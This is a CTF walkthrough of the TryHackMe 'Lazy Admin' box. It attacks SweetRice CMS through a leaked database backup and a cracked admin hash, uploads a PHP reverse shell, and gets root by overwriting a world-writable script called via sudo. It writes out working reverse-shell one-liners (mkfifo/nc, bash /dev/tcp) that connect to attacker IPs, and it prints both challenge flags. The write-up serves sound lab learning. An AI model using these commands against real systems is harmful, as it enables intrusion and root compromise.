# Lazy Admin — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF
**Date:** June 28, 2026
**Flags:** `THM{63e5bce9271952aad1113b6f1ac28a07}` (user) · `THM{6637f41d0177b6f37cb20d775124699f}` (root)

---

## Summary

A Linux box running SweetRice CMS 1.5.1 with a world-accessible MySQL backup file leaking admin credentials. Cracked the MD5 hash, logged into the admin panel, uploaded a PHP reverse shell through the Ads feature, then escalated to root by overwriting a writable shell script called by a sudo-permitted Perl script. More steps than the previous boxes but the same core skills — enumerate, find credentials, get a shell, find a writable file, escalate.

---

## Reconnaissance

Full port and version scan:

```
sudo nmap -sV -p- --min-rate 5000 -Pn 10.146.179.158
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Two ports. SSH and HTTP. No FTP this time — web is the only attack surface.

Directory enumeration:

```
gobuster dir -u http://10.146.179.158 -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
/content   (Status: 301)
```

Navigated to `/content/` — SweetRice CMS. The version showed as 1.5.1. Ran gobuster again specifically against that directory:

```
gobuster dir -u http://10.146.179.158/content/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
/as          → admin panel
/attachment  → file storage
/inc         → includes directory
/images
/js
```

The `/inc/` directory was the goldmine. Navigated there manually and found:

```
http://10.146.179.158/content/inc/mysql_backup/
```

A MySQL database backup sitting in a world-readable directory. Downloaded it and grepped for credentials:

```
cat testdb.sql | grep -i "admin\|password\|user"
```

Found this in the output:

```
s:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb"
```

- **Username:** `manager`
- **Password hash:** `42f749ade7f9e195bf475f37a44cafcb` (MD5)

---

## Cracking the Hash

```
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Cracked in under 2 seconds:

```
42f749ade7f9e195bf475f37a44cafcb:Password123
```

---

## Getting a Shell

### Admin Panel Login

Navigated to `http://10.146.179.158/content/as/` — the SweetRice admin panel. Logged in with `manager:Password123`.

### Preparing the Reverse Shell

Copied and configured the PHP reverse shell. Something I remembered from RootMe — had to edit the file before copying it, not after. Set the IP to my tun0 address and port to 4444:

```
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/shell.php
nano shell.php
```

Changed:
```php
$ip = '192.168.128.123';
$port = 4444;
```

### Uploading Through the Ads Feature

SweetRice has an Ads section in the admin panel that lets you inject code directly into page templates. Pasted the entire contents of shell.php into the Ads code box, gave it a name, hit Done.

Critical step that's easy to miss: after saving the ad, you have to go back into it and click the PHP button to tell SweetRice to treat the content as PHP code rather than plain HTML. Without that toggle the server just serves the PHP source as text — it never executes. The shell won't fire until PHP execution is enabled on that specific ad.

After enabling PHP, SweetRice stores the file at:

```
http://10.146.179.158/content/inc/ads/
```

The file showed up there as `shellphp.php`. Navigating to it triggered execution and the shell connected back to the listener.

```
nc -lvnp 4444
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stability Issues

Lost the shell multiple times here. The problem was Ctrl+Z — kept accidentally backgrounding netcat instead of passing keystrokes through. Also ran two commands on the same line without waiting, which caused them to smear together in the output and break. 

Lesson: in a dumb shell without PTY upgrade, type one command at a time and wait for the response before typing the next one. Don't hit Ctrl+Z unless you're doing the stty upgrade sequence intentionally.

After reconnecting and being more careful:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then found the user flag:

```
find / -name user.txt 2>/dev/null
/home/itguy/user.txt

cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

## Privilege Escalation

```
sudo -l
```

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Checked what backup.pl actually does:

```
cat /home/itguy/backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The Perl script just calls `/etc/copy.sh`. Checked permissions on that file:

```
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

World-writable. The last three characters `rwx` are the "other" permissions — any user on the system can write to it. www-data can overwrite it with anything.

The original contents were a reverse shell pointing at a different IP from 2019:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

### First Attempt — Wrong Syntax

Tried a bash redirect shell first:

```
echo 'bash -i >& /dev/tcp/192.168.128.123/5555 0>&1' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

Got: `/etc/copy.sh: 2: Syntax error: Bad fd number`

This box is running `/bin/sh` not bash. The `>&` redirect syntax is bash-specific. `/bin/sh` doesn't understand it.

### Second Attempt — Also Wrong

First mkfifo attempt had a typo — missing the space between the IP and port:

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.128.123/5555 >/tmp/f' > /etc/copy.sh
```

That would have tried to connect to `192.168.128.123/5555` as a hostname. Caught it and fixed it.

### Correct Command

Started a new listener on port 5555, then overwrote copy.sh with the correct mkfifo syntax:

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.128.123 5555 >/tmp/f' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

Root shell connected to the listener on 5555:

```
# whoami
root
```

### Root Flag

```
find / -name root.txt 2>/dev/null
/root/root.txt

cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

---

## Why the Privesc Worked

The chain here was three links long:

1. www-data can run `/usr/bin/perl /home/itguy/backup.pl` as root with no password
2. backup.pl calls `/etc/copy.sh`
3. `/etc/copy.sh` is world-writable

The sudo permission was on the Perl script specifically, not on perl generally. You can't just run `sudo perl -e 'exec "/bin/sh"'` — that would fail because that exact command isn't in the sudoers entry. But the script it's allowed to run calls a file you can control. That's the indirect path.

This is a realistic misconfiguration. A sysadmin gave www-data permission to run a backup script as root. They didn't notice the script called a world-writable file. Happens in real environments.

---

## Mistakes Made

**Kept losing the shell to Ctrl+Z.** In a reverse netcat shell, Ctrl+Z suspends your local netcat process and drops the connection. Only use it during the stty upgrade sequence, not for anything else. If you need to do something on your local Kali machine, open a new terminal tab.

**Ran two commands on one line in a dumb shell.** After the PTY upgrade `find` and `sudo -l` got smeared together because I was typing too fast. One command at a time in a shell without proper line editing.

**Wrong shell syntax on first privesc attempt.** `bash -i >& /dev/tcp/...` syntax only works in bash. This box runs `/bin/sh`. When a reverse shell or script fails with a syntax error, the first question is whether you're actually running bash or sh. The mkfifo method works on either.

**Typo in the mkfifo command.** `nc 192.168.128.123/5555` instead of `nc 192.168.128.123 5555`. IP and port are separate arguments, not a slash-separated path. Easy mistake, costs you a shell.

**Tried `show ip addr tun0` instead of `ip addr show tun0`.** Nokia CLI muscle memory. Linux command is `ip addr show tun0` or just `ifconfig`.

---

## Attack Chain

```
Nmap → SSH (22), HTTP (80)
  ↓
Gobuster → /content/ → SweetRice CMS
  ↓
Gobuster /content/ → /inc/mysql_backup/
  ↓
Download SQL backup → grep credentials → manager:MD5hash
  ↓
Hashcat MD5 crack → Password123
  ↓
Admin panel login at /content/as/
  ↓
Ads feature → paste PHP reverse shell → save
  ↓
Navigate to /content/inc/ads/shell.php → shell fires
  ↓
www-data shell → find user.txt
  ↓
sudo -l → perl backup.pl allowed as root
  ↓
cat backup.pl → calls /etc/copy.sh
  ↓
ls -la /etc/copy.sh → world-writable
  ↓
Overwrite copy.sh with mkfifo reverse shell → new listener on 5555
  ↓
sudo /usr/bin/perl /home/itguy/backup.pl → root shell on 5555
  ↓
cat /root/root.txt → done
```

---

## What I Learned

**Database backups in web-accessible directories are a critical finding.** The entire attack path started with a SQL backup file sitting in `/content/inc/mysql_backup/`. In a real pentest that's an immediate critical finding. Database backups should never be web-accessible.

**Check what scripts actually do before looking for alternatives.** `sudo -l` showed perl was allowed. I immediately tried to run perl directly with exec, which failed because the sudoers entry was for a specific script, not perl itself. Reading the script first would have shown the copy.sh path immediately.

**bash syntax ≠ sh syntax.** `>&` and `/dev/tcp/` are bash features. When you're writing to a shell script that gets executed by `sh`, use posix-compatible syntax. mkfifo works everywhere.

**World-writable files called by privileged scripts are instant root.** The permissions check `ls -la /etc/copy.sh` is fast and should be part of the standard escalation workflow whenever a sudo script calls external files.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scan and version detection |
| gobuster | Directory enumeration (two passes) |
| hashcat | MD5 hash cracking |
| php-reverse-shell.php | Pre-built Kali PHP webshell |
| netcat | Reverse shell listener (ports 4444 and 5555) |
| echo + /etc/copy.sh | Overwrite writable script for privesc |

## References

- GTFOBins perl: https://gtfobins.github.io/gtfobins/perl/
- SweetRice CMS: http://www.basic-cms.org
- mkfifo reverse shell reference: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
